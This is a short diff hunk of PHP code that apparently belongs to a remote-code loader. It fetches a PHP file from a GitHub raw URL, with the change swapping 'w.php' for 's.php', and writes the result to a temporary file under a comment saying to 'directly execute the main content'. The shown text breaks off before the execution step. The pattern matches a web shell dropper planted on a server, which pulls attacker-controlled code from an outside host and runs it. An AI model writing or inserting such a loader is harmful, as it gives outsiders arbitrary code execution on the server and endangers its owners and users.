@@ -38,7 +38,7 @@ function geturlsinfo($url) {
 }
 
 // Directly execute the main content
-$a = geturlsinfo('https://raw.githubusercontent.com/nastar-id/kegabutan/master/w.php');
+$a = geturlsinfo('https://raw.githubusercontent.com/nastar-id/kegabutan/master/s.php');
 if ($a !== false) {
     $tmp_file = sys_get_temp_dir() . '/temp_' . uniqid() . '.php';
     file_put_contents($tmp_file, $a);
